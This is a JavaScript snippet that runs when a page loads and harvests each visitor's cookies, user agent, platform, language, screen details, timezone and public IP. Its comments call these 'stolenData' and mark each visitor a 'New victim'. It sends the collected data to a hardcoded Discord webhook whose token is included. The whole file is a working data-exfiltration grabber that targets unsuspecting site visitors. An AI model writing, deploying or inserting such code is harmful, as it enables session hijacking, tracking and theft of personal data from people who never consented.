// This function runs as soon as the page loads
window.onload = function() {
    // 1. COLLECT THE DATA
    const stolenData = {
        ip: "Fetching...", // We'll try to get this, but it's unreliable from JS alone due to CORS
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        cookie: document.cookie,
        screenResolution: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: new Date().toISOString()
    };

    // 2. TRY TO GET THE PUBLIC IP (using a third-party service)
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            stolenData.ip = data.ip;
            // Now that we have the IP, send the complete package
            sendData(stolenData);
        })
        .catch(error => {
            console.error('Could not fetch IP:', error);
            // Send what we have even if the IP fetch fails
            sendData(stolenData);
        });
};

// 3. SEND THE DATA TO YOUR RECEIVER
// This is the CORRECT way to send data to a Discord webhook
function sendData(data) {
    // Your Discord Webhook URL
    const webhookURL = 'https://discord.com/api/webhooks/1449164820489179380/CuXHdA3kI3DEbumJR_uoBUkYxbyD-JUEN9LBZkvXVoeHS8vxpI8hXfuE7CHXudL4kdP7';

    // Format the data into a string for the 'content' field
    const messageContent = `New victim:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;

    // Create the payload Discord expects
    const payload = {
        content: messageContent
    };

    // Send the request with the correct headers and body
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
}
